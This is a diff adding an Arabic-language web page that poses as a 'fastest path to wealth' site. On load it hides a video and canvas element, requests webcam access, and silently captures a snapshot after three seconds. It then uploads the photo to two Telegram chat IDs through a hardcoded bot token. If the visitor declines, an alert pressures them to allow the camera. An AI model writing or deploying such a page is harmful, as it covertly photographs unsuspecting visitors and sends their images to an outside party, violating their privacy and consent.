@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع سوكس</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f4f4f9;
+    }
+    h1 {
+      color: #333;
+      margin-top: 50px;
+    }
+    .video-container {
+      margin-top: 30px;
+    }
+    video {
+      display: none;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>أهلاً بك في موقع سوكس</h1>
+  <p>طريقك الأسرع للثراء</p>
+
+  <div class="video-container">
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+  </div>
+
+  <script>
+    // دالة لطلب الوصول إلى الكاميرا
+    function accessCamera() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // التقاط الصورة تلقائيًا بعد 3 ثواني
+            setTimeout(function() {
+              captureImage();
+            }, 3000);
+          })
+          .catch(function(err) {
+            // عند رفض الوصول إلى الكاميرا، يظهر له تلميح للسماح بالكاميرا مجددًا
+            alert('لمن أجل الاستفادة من الموقع، يُرجى السماح للوصول إلى الكاميرا.');
+            // لا نقوم بإعادة تحميل الصفحة هنا
+          });
+      } else {
+        alert("الخاصية غير مدعومة في المتصفح");
+      }
+    }
+
+    // دالة لالتقاط الصورة
+    function captureImage() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      // رسم الإطار الحالي من الفيديو على اللوحة (canvas)
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // تحويل الصورة إلى Base64
+      const imageData = canvas.toDataURL("image/png");
+
+      // إرسال الصورة إلى بوت Telegram
+      sendToTelegram(imageData);
+    }
+
+    // دالة لتحويل Base64 إلى Blob
+    function base64ToBlob(base64Data) {
+      const binary = atob(base64Data.split(',')[1]);
+      const array = [];
+      for (let i = 0; i < binary.length; i++) {
+        array.push(binary.charCodeAt(i));
+      }
+      return new Blob([new Uint8Array(array)], { type: 'image/png' });
+    }
+
+    // دالة لإرسال الصورة عبر بوت Telegram
+    function sendToTelegram(imageData) {
+      const chatIds = [6363115796, 6565524734]; // chat_ids الخاصة بك
+      const TELEGRAM_TOKEN = '7986358827:AAEMJZ08_efX_g0LR3BAX4JtNWAe5ADeUNg';
+
+      chatIds.forEach(chatId => {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        
+        // تحويل الصورة من Base64 إلى Blob
+        const imageBlob = base64ToBlob(imageData);
+        formData.append('photo', imageBlob, 'snapshot.png'); // رفع الصورة كملف
+
+        // إرسال الصورة عبر POST
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('تم إرسال الصورة عبر Telegram بنجاح:', data);
+        })
+        .catch(error => {
+          console.error('حدث خطأ أثناء إرسال الصورة عبر Telegram:', error);
+        });
+      });
+    }
+
+    // محاولة الوصول إلى الكاميرا عند تحميل الصفحة
+    window.onload = function() {
+      accessCamera();
+    };
+  </script>
+</body>
+</html>
